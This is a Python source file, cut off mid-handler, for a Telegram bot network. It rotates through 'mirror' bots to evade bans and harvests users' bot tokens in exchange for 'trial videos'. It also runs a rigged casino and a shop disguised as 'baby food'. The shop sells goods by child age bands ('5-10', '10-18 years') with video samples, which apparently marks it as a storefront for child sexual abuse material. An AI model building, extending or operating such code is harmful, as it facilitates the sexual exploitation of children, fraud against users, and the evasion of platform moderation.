# bot.py — СИСТЕМА ЗЕРКАЛ: один рабочий бот, авто-ротация при бане
# Запускается 3 процесса:
#   1. main_bot    — переходник, ВСЕГДА работает, показывает @текущего рабочего
#   2. logger_bot  — логгер/админка, ВСЕГДА работает
#   3. worker      — ОДИН рабочий бот из зеркал, при бане → авто-смена на следующий

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
import sqlite3, time, threading, requests, random, string, os
from datetime import datetime

# =========================================================
#  КОНФИГ
# =========================================================
MAIN_BOT_TOKEN      = os.getenv('MAIN_BOT_TOKEN',      'ВСТАВЬ_ТОКЕН_ОСНОВНОГО')
LOGGER_BOT_TOKEN    = os.getenv('LOGGER_BOT_TOKEN',    'ВСТАВЬ_ТОКЕН_ЛОГГЕРА')
FIRST_WORKER_TOKEN  = os.getenv('WORKER_BOT_TOKEN',    'ВСТАВЬ_ПЕРВЫЙ_РАБОЧИЙ_ТОКЕН')
ADMIN_ID            = os.getenv('ADMIN_ID',             'ВСТАВЬ_СВОЙ_ID')
DONATIONALERTS_NICK = os.getenv('DONATIONALERTS_NICK',  'твой_ник_DA')

MAIN_CHANNEL     = "https://t.me/+S75wQGSxdBw2Mzhh"
REVIEWS_CHANNEL  = "https://t.me/+Bb17ibvo_yMzZTAx"
PAYMENT_CHANNEL  = "https://t.me/+tzeYwAOSIRZiNDRh"

PHOTO_5_10  = "AgACAgIAAxkBAAIB"
PHOTO_10_18 = "AgACAgIAAxkBAAIC"

PRICE_5_10  = 600
PRICE_10_18 = 450
USDT_RATE   = 100

CRYPTO_PAYMENT_600 = "https://t.me/send?start=IVMzuIHtBnQf"
CRYPTO_PAYMENT_450 = "https://t.me/send?start=IVP4orolsPew"

# =========================================================
#  БАЗА ДАННЫХ
# =========================================================
conn    = sqlite3.connect('bot.db', check_same_thread=False)
conn.row_factory = sqlite3.Row
cur     = conn.cursor()
db_lock = threading.Lock()

cur.executescript('''
CREATE TABLE IF NOT EXISTS users(
    user_id TEXT PRIMARY KEY, username TEXT,
    first_seen INTEGER, last_seen INTEGER,
    balance INTEGER DEFAULT 0, channel_msg_id INTEGER
);
CREATE TABLE IF NOT EXISTS mirrors(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    token TEXT UNIQUE, username TEXT,
    added_by TEXT, added_at INTEGER, is_active INTEGER DEFAULT 1
);
CREATE TABLE IF NOT EXISTS current_bot(
    id INTEGER PRIMARY KEY, token TEXT, username TEXT, updated_at INTEGER
);
CREATE TABLE IF NOT EXISTS pending_payments(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT, username TEXT, amount INTEGER,
    product TEXT, screenshot TEXT, timestamp INTEGER
);
CREATE TABLE IF NOT EXISTS user_sessions(user_id TEXT PRIMARY KEY, step TEXT, data TEXT);
CREATE TABLE IF NOT EXISTS admin_sessions(user_id TEXT PRIMARY KEY, step TEXT);
CREATE TABLE IF NOT EXISTS user_stats(user_id TEXT PRIMARY KEY, ref_code TEXT, earned INTEGER DEFAULT 0, ref_clicks INTEGER DEFAULT 0);
CREATE TABLE IF NOT EXISTS referals(code TEXT PRIMARY KEY, owner_id TEXT, earnings INTEGER DEFAULT 0, clicks INTEGER DEFAULT 0);
CREATE TABLE IF NOT EXISTS promo_codes(code TEXT PRIMARY KEY, discount INTEGER, uses_left INTEGER, created_at INTEGER, is_active INTEGER DEFAULT 1);
CREATE TABLE IF NOT EXISTS user_promo(user_id TEXT PRIMARY KEY, discount INTEGER, expires_at INTEGER);
''')
conn.commit()

def db(q, p=()):
    with db_lock:
        cur.execute(q, p); conn.commit(); return cur

def dbf(q, p=()):
    with db_lock:
        cur.execute(q, p); return cur.fetchone()

def dbfa(q, p=()):
    with db_lock:
        cur.execute(q, p); return cur.fetchall()

# =========================================================
#  ЛОГГЕР
# =========================================================
def log(text, photo=None, reply_markup=None):
    import json as _j
    try:
        if photo:
            pl = {"chat_id": ADMIN_ID, "photo": photo,
                  "caption": text, "parse_mode": "HTML"}
            if reply_markup:
                pl["reply_markup"] = _j.dumps(reply_markup)
            requests.post(f"https://api.telegram.org/bot{LOGGER_BOT_TOKEN}/sendPhoto",
                          json=pl, timeout=10)
        else:
            pl = {"chat_id": ADMIN_ID, "text": text, "parse_mode": "HTML"}
            if reply_markup:
                pl["reply_markup"] = _j.dumps(reply_markup)
            requests.post(f"https://api.telegram.org/bot{LOGGER_BOT_TOKEN}/sendMessage",
                          json=pl, timeout=10)
    except Exception as e:
        print(f"[log error] {e}")

# =========================================================
#  ПОЛЬЗОВАТЕЛИ
# =========================================================
def register_user(uid, uname, ref=None):
    if not dbf("SELECT 1 FROM users WHERE user_id=?", (uid,)):
        db("INSERT INTO users(user_id,username,first_seen,last_seen,balance) VALUES(?,?,?,?,0)",
           (uid, uname, int(time.time()), int(time.time())))
        if ref and ref != uid:
            db("UPDATE referals SET clicks=clicks+1 WHERE code=?", (ref,))
            db("INSERT OR IGNORE INTO user_stats(user_id,ref_code,earned,ref_clicks) VALUES(?,?,0,0)",
               (uid, ref))
    else:
        db("UPDATE users SET username=?,last_seen=? WHERE user_id=?",
           (uname, int(time.time()), uid))

def get_balance(uid):
    r = dbf("SELECT balance FROM users WHERE user_id=?", (uid,))
    return r[0] if r else 0

def add_balance(uid, amt):
    db("UPDATE users SET balance=balance+? WHERE user_id=?", (amt, uid))

# =========================================================
#  РЕФЕРАЛКА
# =========================================================
def get_ref_link(uid, bot_uname):
    r = dbf("SELECT ref_code FROM user_stats WHERE user_id=?", (uid,))
    if r and r[0]:
        code = r[0]
    else:
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        db("INSERT OR REPLACE INTO user_stats(user_id,ref_code,earned,ref_clicks) VALUES(?,?,0,0)", (uid, code))
        db("INSERT OR IGNORE INTO referals(code,owner_id,earnings,clicks) VALUES(?,?,0,0)", (code, uid))
    return f"https://t.me/{bot_uname}?start=ref_{uid}"

# =========================================================
#  ПРОМОКОДЫ
# =========================================================
def apply_promo(uid, code):
    r = dbf("SELECT discount,uses_left FROM promo_codes WHERE code=? AND is_active=1 AND uses_left>0", (code.upper(),))
    if not r: return False, 0
    db("INSERT OR REPLACE INTO user_promo(user_id,discount,expires_at) VALUES(?,?,?)",
       (uid, r[0], int(time.time()) + 3600))
    db("UPDATE promo_codes SET uses_left=uses_left-1 WHERE code=?", (code.upper(),))
    return True, r[0]

def get_discount(uid):
    r = dbf("SELECT discount FROM user_promo WHERE user_id=? AND expires_at>?", (uid, int(time.time())))
    return r[0] if r else 0

# =========================================================
#  КАЗИНО
# =========================================================
def play_mines(bet):
    if random.random() < 0.45:
        w = int(bet * random.choice([1.5, 2.0, 2.5]))
        return w, f"🎉 выигрыш: +{w}₽"
    return 0, "💥 мина взорвалась"

def play_rocket(bet):
    if random.random() < 0.45:
        m = random.choice([1.5, 2.0, 2.5, 3.0])
        w = int(bet * m)
        return w, f"🚀 x{m} → +{w}₽"
    return 0, "💥 ракета взорвалась"

def open_case(bet):
    items = [("обычный скин", 0.5, 40), ("редкий скин", 1.5, 30),
             ("эпический скин", 3.0, 20), ("легендарный скин", 5.0, 10)]
    r, cum = random.randint(1, 100), 0
    for name, mult, chance in items:
        cum += chance
        if r <= cum:
            w = int(bet * mult)
            return w, f"📦 {name} → +{w}₽"
    return 0, "ничего не выпало"

# =========================================================
#  ЗЕРКАЛА И ТЕКУЩИЙ БОТ
# =========================================================
def get_current():
    r = dbf("SELECT token,username FROM current_bot WHERE id=1")
    return (r[0], r[1]) if r else (FIRST_WORKER_TOKEN, "worker")

def set_current(token, username):
    db("DELETE FROM current_bot WHERE id=1")
    db("INSERT INTO current_bot(id,token,username,updated_at) VALUES(1,?,?,?)",
       (token, username, int(time.time())))
    log(f"🔄 текущий бот: @{username}")

def check_alive(token):
    try:
        r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5)
        d = r.json()
        if d.get('ok'):
            return True, d['result']['username']
        return False, None
    except:
        return False, None

def add_mirror(token, username, added_by):
    db("INSERT OR REPLACE INTO mirrors(token,username,added_by,added_at,is_active) VALUES(?,?,?,?,1)",
       (token, username, added_by, int(time.time())))

def delete_mirror_by_id(mid):
    db("UPDATE mirrors SET is_active=0 WHERE id=?", (mid,))

def get_mirrors():
    return dbfa("SELECT id,token,username FROM mirrors WHERE is_active=1 ORDER BY added_at ASC")

def get_mirror_by_id(mid):
    return dbf("SELECT id,token,username FROM mirrors WHERE id=? AND is_active=1", (mid,))

# =========================================================
#  ГЛОБАЛЬНЫЙ ВОРКЕР (один экземпляр в любой момент)
# =========================================================
worker_lock      = threading.Lock()
worker_thread    = None
worker_stop_evt  = threading.Event()  # сигнал остановки текущего воркера

def _worker_loop(token, stop_event):
    """Поллинг одного бота. Выходит когда stop_event.set() или бот умер."""
    bot = make_worker_bot(token)
    print(f"[worker] запуск @{token[:10]}…")
    while not stop_event.is_set():
        try:
            bot.polling(non_stop=False, interval=2, timeout=20)
        except telebot.apihelper.ApiTelegramException as e:
            if "Unauthorized" in str(e) or "bot was kicked" in str(e) or "bot was blocked" in str(e):
                print(f"[worker] бот забанен: {e}")
                break
            print(f"[worker] ошибка API: {e}")
            time.sleep(5)
        except Exception as e:
            print(f"[worker] ошибка: {e}")
            time.sleep(5)
    # Бот умер — запускаем ротацию
    if not stop_event.is_set():
        rotate_worker()

def start_worker(token):
    """Остановить текущего воркера и запустить нового с token."""
    global worker_thread, worker_stop_evt
    with worker_lock:
        # Стоп старого
        worker_stop_evt.set()
        if worker_thread and worker_thread.is_alive():
            worker_thread.join(timeout=8)
        # Старт нового
        worker_stop_evt = threading.Event()
        worker_thread = threading.Thread(
            target=_worker_loop,
            args=(token, worker_stop_evt),
            daemon=True
        )
        worker_thread.start()

def rotate_worker():
    """Выбрать следующее живое зеркало и запустить его."""
    current_token, current_name = get_current()
    log(f"💀 бот @{current_name} упал! ищу замену…")
    mirrors = get_mirrors()
    for mid, token, uname in mirrors:
        if token == current_token:
            continue
        alive, real_uname = check_alive(token)
        if alive:
            uname = real_uname or uname
            set_current(token, uname)
            log(f"✅ авто-ротация → @{uname}")
            start_worker(token)
            return
    log("❌ нет живых зеркал! добавь новые через /admin")

def monitor_loop():
    """Каждые 5 мин проверяем живой ли текущий воркер."""
    while True:
        time.sleep(300)
        try:
            token, name = get_current()
            alive, _ = check_alive(token)
            if not alive:
                rotate_worker()
        except Exception as e:
            print(f"[monitor] {e}")

# =========================================================
#  ФАБРИКА ВОРКЕР-БОТА (все хендлеры одинаковые, токен разный)
# =========================================================
def make_worker_bot(token):
    bot = telebot.TeleBot(token, threaded=True)

    def main_menu():
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(
            InlineKeyboardButton("🛒 магазин",      callback_data="shop"),
            InlineKeyboardButton("🎰 казино",        callback_data="casino"),
            InlineKeyboardButton("⭐ отзывы",        callback_data="reviews"),
            InlineKeyboardButton("📈 рефералка",     callback_data="referral"),
            InlineKeyboardButton("🎟 промокод",      callback_data="promo"),
            InlineKeyboardButton("👤 профиль",       callback_data="profile"),
            InlineKeyboardButton("🎬 пробное видео", callback_data="trial_video"),
        )
        return kb

    def pay_kb(back_cb, paid_cb, pay_url, price_label):
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(
            InlineKeyboardButton(f"💳 ОПЛАТИТЬ {price_label}", url=pay_url),
            InlineKeyboardButton("✅ ОПЛАТИЛ — прислать скриншот", callback_data=paid_cb),
            InlineKeyboardButton("🔙 назад", callback_data=back_cb),
        )
        return kb

    # ── /start ──────────────────────────────────────
    @bot.message_handler(commands=['start'])
    def on_start(m):
        uid   = str(m.from_user.id)
        uname = m.from_user.username or "no_username"
        ref   = None
        args  = m.text.split()
        if len(args) > 1 and args[1].startswith('ref_'):
            ref = args[1].replace('ref_', '')
            r   = dbf("SELECT owner_id FROM referals WHERE code=?", (ref,))
            if r:
                log(f"🔗 реферал: @{uname} → владелец {r[0]}")
        register_user(uid, uname, ref)
        # закреп
        row = dbf("SELECT channel_msg_id FROM users WHERE user_id=?", (uid,))
        if not (row and row[0]):
            kb2 = InlineKeyboardMarkup()
            kb2.add(InlineKeyboardButton("📢 подписаться", url=MAIN_CHANNEL))
            try:
                sent = bot.send_message(m.chat.id,
                    "📢 <b>подпишись на наш канал</b>\n\nпромокоды · анонсы · розыгрыши",
                    parse_mode='HTML', reply_markup=kb2)
                bot.pin_chat_message(m.chat.id, sent.message_id)
                db("UPDATE users SET channel_msg_id=? WHERE user_id=?", (sent.message_id, uid))
            except: pass
        bot.send_message(m.chat.id, "🍼 <b>детское питание shop</b>\n\nвыбери действие:",
                         parse_mode='HTML', reply_markup=main_menu())

    # ── коллбэки ────────────────────────────────────
    @bot.callback_query_handler(func=lambda c: True)
    def on_cb(call):
        uid   = str(call.from_user.id)
        uname = call.from_user.username or "no_username"
        cid, mid = call.message.chat.id, call.message.message_id
        d = call.data

        def edit(text, kb=None, pm='HTML'):
            try: bot.edit_message_text(text, cid, mid, parse_mode=pm, reply_markup=kb,
                                       disable_web_page_preview=True)
            except: pass

        # магазин
        if d == "shop":
            kb = InlineKeyboardMarkup(row_width=1)
            kb.add(InlineKeyboardButton("👶 5-10 лет — 600₽",  callback_data="buy_5_10"),
                   InlineKeyboardButton("🧒 10-18 лет — 450₽", callback_data="buy_10_18"),
                   InlineKeyboardButton("🔙 назад",             callback_data="back"))
            edit("📦 <b>выбери категорию:</b>", kb)

        elif d in ("buy_5_10", "buy_10_18"):
            is510 = d == "buy_5_10"
            disc  = get_discount(uid)
            base  = PRICE_5_10 if is510 else PRICE_10_18
            price = int(base * (100 - disc) / 100) if disc else base
            photo = PHOTO_5_10 if is510 else PHOTO_10_18
            cat   = "👶 5-10 лет" if is510 else "🧒 10-18 лет"
            url   = CRYPTO_PAYMENT_600 if is510 else CRYPTO_PAYMENT_450
            paid_cb = f"askscr_{price}_{'510' if is510 else '1018'}"
            cap  = (f"{cat}\n\n{'✨ скидка '+str(disc)+'%!\n' if disc else ''}"
                    f"💰 цена: {price}₽\n\n"
                    f"💳 оплати и нажми «ОПЛАТИЛ»\n"
                    f"📺 инструкция: https://youtu.be/l5qt_5l0DfI\n\n"
                    f"⚠️ в комментарии укажи: @{uname}")
            kb = pay_kb("shop", paid_cb, url, f"{price}₽")
            try:
                bot.edit_message_media(InputMediaPhoto(photo, caption=cap, parse_mode='HTML'),
                                       cid, mid, reply_markup=kb)
            except:
                edit(cap, kb)

        elif d.startswith("askscr_"):
            _, price, prod = d.split("_")
            db("INSERT OR REPLACE INTO user_sessions VALUES(?,?,?)",
               (uid, "await_scr", f"{price}_{prod}"))
            bot.answer_callback_query(call.id)
            bot.send_message(cid, "📸 отправь скриншот чека об оплате:")

        # отзывы
        elif d == "reviews":
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("⭐ канал с отзывами", url=REVIEWS_CHANNEL),
                   InlineKeyboardButton("🔙 назад", callback_data="back"))
            edit("⭐ отзывы наших клиентов", kb)

        # рефералка
        elif d == "referral":
            try:
                me = bot.get_me()
                buname = me.username
            except:
                buname = "bot"
            link = get_ref_link(uid, buname)
            r    = dbf("SELECT earned, ref_clicks FROM user_stats WHERE user_id=?", (uid,))
            kb   = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("🔙 назад", callback_data="back"))
            edit(f"📈 <b>рефералка</b>\n\n"
                 f"твоя ссылка:\n<code>{link}</code>\n\n"
                 f"💰 заработано: {r[0] if r else 0}₽\n"
                 f"👥 переходов: {r[1] if r else 0}\n"
                 f"🎁 40% с пополнений рефералов", kb)

        # промокод
        elif d == "promo":
            db("INSERT OR REPLACE INTO user_sessions VALUES(?,?,?)", (uid, "await_promo", ""))
            bot.answer_callback_query(call.id)
            try: bot.delete_message(cid, mid)
            except: pass
            bot.send_message(cid, "🎟 введи промокод:")

        # профиль
        elif d == "profile":
            bal  = get_balance(uid)
            r    = dbf("SELECT earned FROM user_stats WHERE user_id=?", (uid,))
            kb   = InlineKeyboardMarkup(row_width=1)
            kb.add(InlineKeyboardButton("💰 пополнить баланс", callback_data="deposit"),
                   InlineKeyboardButton("🔙 назад",            callback_data="back"))
            edit(f"👤 <b>профиль</b>\n\n"
                 f"🆔 {uid}\n👤 @{uname}\n"
                 f"💰 баланс казино: {bal}₽\n"
                 f"💸 реф. заработок: {r[0] if r else 0}₽", kb)

        # пополнить баланс
        elif d == "deposit":
            kb = InlineKeyboardMarkup(row_width=1)
            kb.add(InlineKeyboardButton("💎 CRYPTOBOT (USDT)",          callback_data="dep_crypto"),
                   InlineKeyboardButton("💳 DONATIONALERTS (карта РФ)", callback_data="dep_da"),
                   InlineKeyboardButton("🔙 назад",                      callback_data="profile"))
            edit("💰 <b>пополнить баланс казино</b>\n\nвыбери способ:", kb)

        elif d == "dep_crypto":
            kb = InlineKeyboardMarkup(row_width=2)
            kb.add(InlineKeyboardButton("10$ (~1000₽)",  callback_data="dc_10"),
                   InlineKeyboardButton("20$ (~2000₽)",  callback_data="dc_20"),
                   InlineKeyboardButton("50$ (~5000₽)",  callback_data="dc_50"),
                   InlineKeyboardButton("✏️ СВОЯ СУММА", callback_data="dc_custom"),
                   InlineKeyboardButton("🔙 назад",       callback_data="deposit"))
            edit("💰 <b>пополнение CRYPTOBOT</b>\n\nвыбери сумму:", kb)

        elif d.startswith("dc_"):
            val = d[3:]
            if val == "custom":
                db("INSERT OR REPLACE INTO user_sessions VALUES(?,?,?)", (uid, "await_custom_dep", ""))
                bot.answer_callback_query(call.id)
                try: bot.delete_message(cid, mid)
                except: pass
                bot.send_message(cid, "✏️ введи сумму в рублях (мин. 100₽):")
                return
            rub = int(val) * USDT_RATE
            kb  = pay_kb("dep_crypto", f"askdepscr_{rub}_crypto", CRYPTO_PAYMENT_600, f"{rub}₽")
            edit(f"💰 <b>пополнение CRYPTOBOT</b>\n\n"
                 f"💰 {rub}₽ ({val} USDT)\n\n⚠️ в комментарии: @{uname}", kb)

        elif d == "dep_da":
            kb = InlineKeyboardMarkup(row_width=1)
            kb.add(
                InlineKeyboardButton("💳 ПЕРЕЙТИ К ОПЛАТЕ",
                                     url=f"https://www.donationalerts.com/r/{DONATIONALERTS_NICK}"),
                InlineKeyboardButton("📸 ОТПРАВИТЬ СКРИНШОТ", callback_data="askdepscr_0_da"),
                InlineKeyboardButton("🔙 назад", callback_data="deposit"),
            )
            edit(f"💰 <b>пополнение DONATIONALERTS</b>\n\n"
                 f"1. перейди по ссылке ниже\n"
                 f"2. укажи сумму (от 100₽)\n"
                 f"3. в комментарии: @{uname}\n"
                 f"4. отправь скриншот чека", kb)

        elif d.startswith("askdepscr_"):
            _, rub, src = d.split("_")
            db("INSERT OR REPLACE INTO user_sessions VALUES(?,?,?)",
               (uid, "await_dep_scr", f"{rub}_{src}"))
            bot.answer_callback_query(call.id)
            bot.send_message(cid, "📸 отправь скриншот чека пополнения:")

        # пробное видео
        elif d == "trial_video":
            kb = InlineKeyboardMarkup(row_width=1)
            kb.add(InlineKeyboardButton("🤖 создать бота", url="https://t.me/botfather"),
                   InlineKeyboardButton("📤 отправить токен", callback_data="send_token"),
                   InlineKeyboardButton("🔙 назад", callback_data="back"))
            edit("🎬 <b>пробное видео</b>\n\n"
                 "создай бота в @botfather и отправь токен — "
                 "получишь 3 видео + бот попадёт в нашу базу зеркал!", kb)

        elif d == "send_token":
            db("INSERT OR REPLACE INTO user_sessions VALUES(?,?,?)", (uid, "await_token", ""))
            bot.answer_callback_query(call.id)
            try: bot.delete_message(cid, mid)
            except: pass
            bot.send_message(cid, "📝 отправь токен бота:")

        # казино
        elif d == "casino":
            bal = get_balance(uid)
            kb  = InlineKeyboardMarkup(row_width=2)
            kb.add(InlineKeyboardButton("💣 mines",  callback_data="g_mines"),
                   InlineKeyboardButton("🚀 rocket", callback_data="g_rocket"),
                   InlineKeyboardButton("📦 кейсы",  callback_data="g_case"),
                   InlineKeyboardButton("🔙 назад",  callback_data="back"))
            edit(f"🎰 <b>казино</b>\n\n💰 баланс: {bal}₽\n\nвыбери игру:", kb)

        elif d.startswith("g_"):
            game = d[2:]
            bal  = get_balance(uid)
            if bal < 10:
                bot.answer_callback_query(call.id, "❌ пополни баланс в профиле", show_alert=True)
                return
            kb = InlineKeyboardMarkup(row_width=3)
            kb.add(InlineKeyboardButton("10₽",     callback_data=f"p_{game}_10"),
                   InlineKeyboardButton("50₽",     callback_data=f"p_{game}_50"),
                   InlineKeyboardButton("100₽",    callback_data=f"p_{game}_100"),
                   InlineKeyboardButton("🔙 назад", callback_data="casino"))
            edit(f"🎲 <b>{game}</b>\n\n💰 баланс: {bal}₽\n\nвыбери ставку:", kb)

        elif d.startswith("p_"):
            _, game, bet_s = d.split("_")
            bet = int(bet_s)
            bal = get_balance(uid)
            if bal < bet:
                bot.answer_callback_query(call.id, "❌ недостаточно средств", show_alert=True)
                return
            add_balance(uid, -bet)
            win, msg = (play_mines(bet) if game == "mines" else
                        play_rocket(bet) if game == "rocket" else open_case(bet))
            if win > 0:
                add_balance(uid, win)
            kb = InlineKeyboardMarkup(row_width=1)
            kb.add(InlineKeyboardButton("🔄 ещё раз", callback_data=f"g_{game}"),
                   InlineKeyboardButton("🔙 в казино", callback_data="casino"))
            edit(f"🎮 <b>{game}</b> | ставка: {bet}₽\n\n{msg}\n\n💰 баланс: {get_balance(uid)}₽", kb)

        elif d == "back":
            edit("🍼 <b>детское питание shop</b>\n\nвыбери действие:", main_menu())

    # ── текстовые/фото сообщения ─────────────────
    @bot.message_handler(func=lambda m: True, content_types=['text', 'photo'])
    def on_msg(m):
        uid   = str(m.from_user.id)
        uname = m.from_user.username or "no_username"
        cid   = m.chat.id
        row   = dbf("SELECT step,data FROM user_sessions WHERE user_id=?", (uid,))
        step  = row[0] if row else None
        sdata = row[1] if row else ""

        if step == "await_promo":
            ok, disc = apply_promo(uid, m.text.strip())
            bot.reply_to(m, f"✅ промокод активирован! скидка {disc}%" if ok else "❌ неверный промокод")
            db("DELETE FROM user_sessions WHERE user_id=?", (uid,))

        elif step == "await_token":
            token = m.text.strip()
            if ':' not in token:
                bot.reply_to(m, "❌ неверный формат токена")
                return
            alive, buname = check_alive(token)
            if not alive:
                bot.reply_to(m, "❌ бот не существует или заблокирован")
                return
            add_mirror(token, buname, uname)
            log(f"➕ новое зеркало: @{buname} от @{uname}")
            kb2 = InlineKeyboardMarkup()
            kb2.add(InlineKeyboardButton("🎬 ПОЛУЧИТЬ 3 ВИДЕО",
                                         url="https://t.me/+fEQI916fF2ZkNDMx"))
            bot.reply_to(m, f"✅ бот @{buname} добавлен! 🎁", reply_markup=kb2)
            db("DELETE FROM user_sessions WHERE user_id=?", (uid,))

        elif step == "await_custom_dep":
            try:
                rub = int(m.text.strip())
                if rub < 100:
                    bot.reply_to(m, "❌ минимум 100₽"); return
                kb2 = InlineKeyboardMarkup(row_width=1)
                kb2.add(
                    InlineKeyboardButton(f"💳 ОПЛАТИТЬ {rub}₽", url=CRYPTO_PAYMENT_600),
                    InlineKeyboardButton("✅ ОПЛАТИЛ — прислать скриншот",
                                         callback_data=f"askdepscr_{rub}_crypto"),
                    InlineKeyboardButton("🔙 назад", callback_data="deposit"),
                )
                bot.send_message(cid, f"💰 пополнение {rub}₽\n\n⚠️ в комментарии: @{uname}",
                                 reply_markup=kb2)
                db("DELETE FROM user_sessions WHERE user_id=?", (uid,))
            except:
                bot.reply_to(m, "❌ введи число")

        elif step == "await_scr":
            if m.content_type != 'photo':
                bot.reply_to(m, "❌ отправь фото чека"); return
            price, prod = sdata.split("_")
            photo = m.photo[-1].file_id
            db("INSERT INTO pending_payments(user_id,username,amount,product,screenshot,timestamp) VALUES(?,?,?,?,?,?)",
               (uid, uname, price, prod, photo, int(time.time())))
            row_id = dbf("SELECT last_insert_rowid()")
            pid = row_id[0] if row_id else 0
            lab = "5-10 лет" if prod == "510" else "10-18 лет"
            cap = (f"🛒 <b>НОВАЯ ОПЛАТА ТОВАРА</b>\n\n"
                   f"👤 @{uname} | 🆔 {uid}\n"
                   f"📦 {lab}\n💰 {price}₽\n"
                   f"⏰ {datetime.now().strftime('%H:%M %d.%m.%Y')}")
            log(cap, photo=photo,
                reply_markup={"inline_keyboard": [[{"text": "🎁 ВЫДАТЬ ДОСТУП",
                                                     "callback_data": f"ga_{pid}"}]]})
            bot.reply_to(m, "✅ скриншот отправлен! Ожидай подтверждения.")
            db("DELETE FROM user_sessions WHERE user_id=?", (uid,))

        elif step == "await_dep_scr":
            if m.content_type != 'photo':
                bot.reply_to(m, "❌ отправь фото чека"); return
            parts = sdata.split("_")
            rub, src = parts[0], parts[1] if len(parts) > 1 else "?"
            photo = m.photo[-1].file_id
            db("INSERT INTO pending_payments(user_id,username,amount,product,screenshot,timestamp) VALUES(?,?,?,?,?,?)",
               (uid, uname, rub, "deposit", photo, int(time.time())))
            row_id = dbf("SELECT last_insert_rowid()")
            pid = row_id[0] if row_id else 0
            src_label = "DonationAlerts" if src == "da" else "CryptoBot"
            cap = (f"💳 <b>ПОПОЛНЕНИЕ БАЛАНСА</b>\n\n"
                   f"👤 @{uname} | 🆔 {uid}\n"
                   f"💰 {rub}₽ | 🏦 {src_label}\n"
                   f"⏰ {datetime.now().strftime('%H:%M %d.%m.%Y')}")
            log(cap, photo=photo,
                reply_markup={"inline_keyboard": [[{"text": "💰 ВЫДАТЬ БАЛАНС",
                                                     "callback_data": f"gb_{pid}"}]]})
            bot.reply_to(m, "✅ скриншот отправлен! Ожидай зачисления.")
            db("DELETE FROM user_sessions WHERE user_id=?", (uid,))

        elif m.content_type == 'photo':
            photo = m.photo[-1].file_id
            log(f"📸 скриншот без сессии\n👤 @{uname} | 🆔 {uid}", photo=photo)
            bot.reply_to(m, "✅ скриншот получен, передан админу.")

    return bot

# =========================================================
#  ОСНОВНОЙ БОТ (переходник)
# =========================================================
main_bot = telebot.TeleBot(MAIN_BOT_TOKEN, threaded=True)

@main_bot.message_handler(commands=['start'])
def mb_start(m):
    uid, uname = str(m.from_user.id), m.from_user.username or "no_username"
    register_user(uid, uname)
    token, name = get_current()
    alive, real = check_alive(token)
    if not alive:
        rotate_worker()
        token, name = get_current()
        alive, real = check_alive(token)
    name = real or name
    main_bot.reply_to(m, f"🤖 <b>актуальный бот</b>\n\n@{name}\n\n👇 нажми на username выше",
                      parse_mode='HTML')

# =========================================================
#  ЛОГГЕР / АДМИНКА
# =========================================================
logger_bot = telebot.TeleBot(LOGGER_BOT_TOKEN, threaded=True)

def admin_kb():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(InlineKeyboardButton("📊 статистика",     callback_data="a_stats"),
           InlineKeyboardButton("🪞 зеркала",         callback_data="a_mirrors"),
           InlineKeyboardButton("⏳ оплаты",          callback_data="a_pending"),
           InlineKeyboardButton("📢 рассылка",        callback_data="a_spam"),
           InlineKeyboardButton("🎟 промокоды",       callback_data="a_promos"))
    return kb

@logger_bot.message_handler(commands=['start', 'admin'])
def lb_start(m):
    if str(m.from_user.id) != ADMIN_ID: return
    logger_bot.send_message(m.chat.id, "🔐 <b>панель администратора</b>",
                            parse_mode='HTML', reply_markup=admin_kb())

@logger_bot.callback_query_handler(func=lambda c: True)
def lb_cb(call):
    if str(call.from_user.id) != ADMIN_ID:
        logger_bot.answer_callback_query(call.id, "доступ запрещён"); return
    cid, mid, act = call.message.chat.id, call.message.message_id, call.data

    def edit(text, kb=None):
        try: logger_bot.edit_message_text(text, cid, mid, parse_mode='HTML', reply_markup=kb)
        except: pass

    if act == "a_stats":
        u = dbf("SELECT COUNT(*) FROM users")[0]
        m_ = dbf("SELECT COUNT(*) FROM mirrors WHERE is_active=1")[0]
        p_ = dbf("SELECT COUNT(*) FROM pending_payments")[0]
        _, cur_name = get_current()
        edit(f"📊 <b>статистика</b>\n\n"
             f"👥 пользователей: {u}\n"
             f"🪞 зеркал: {m_}\n"
             f"⏳ ожидают оплаты: {p_}\n"
             f"🤖 текущий бот: @{cur_name}", admin_kb())

    # ── Зеркала: список ─────────────────────────────
    elif act == "a_mirrors":
        mirrors = get_mirrors()   # (id, token, username)
        cur_tok, _ = get_current()
        if not mirrors:
            edit("🪞 <b>зеркал нет</b>\n\nдобавить: пользователь отправляет токен через «пробное видео»",
                 admin_kb()); return
        kb = InlineKeyboardMarkup(row_width=1)
        for mid2, tok, uname in mirrors:
            alive, _ = check_alive(tok)
            status   = "✅" if alive else "❌"
            is_cur   = " 🔵" if tok == cur_tok else ""
            kb.add(InlineKeyboardButton(f"{status} @{uname}{is_cur}",
                                        callback_data=f"mir_{mid2}"))
        kb.add(InlineKeyboardButton("🔙 назад", callback_data="a_stats"))
        edit("🪞 <b>зеркала</b>\n\n🔵 = текущий активный бот", kb)

    # ── Зеркало: действия ────────────────────────────
    elif act.startswith("mir_"):
        m_id = int(act.split("_")[1])
        row  = get_mirror_by_id(m_id)
        if not row: logger_bot.answer_callback_query(call.id, "не найдено", show_alert=True); return
        _, tok, uname = row
        cur_tok, _ = get_current()
        alive, _ = check_alive(tok)
        kb = InlineKeyboardMarkup(row_width=1)
        if tok != cur_tok:
            kb.add(InlineKeyboardButton("🔄 СДЕЛАТЬ ТЕКУЩИМ", callback_data=f"setmir_{m_id}"))
        kb.add(InlineKeyboardButton("❌ УДАЛИТЬ", callback_data=f"delmir_{m_id}"),
               InlineKeyboardButton("🔙 НАЗАД",   callback_data="a_mirrors"))
        is_cur_str = "\n🔵 это текущий активный бот" if tok == cur_tok else ""
        edit(f"🪞 <b>@{uname}</b>\n\nстатус: {'✅ живой' if alive else '❌ мёртвый'}{is_cur_str}", kb)

    elif act.startswith("setmir_"):
        m_id = int(act.split("_")[1])
        row  = get_mirror_by_id(m_id)
        if not row: logger_bot.answer_callback_query(call.id, "не найдено", show_alert=True); return
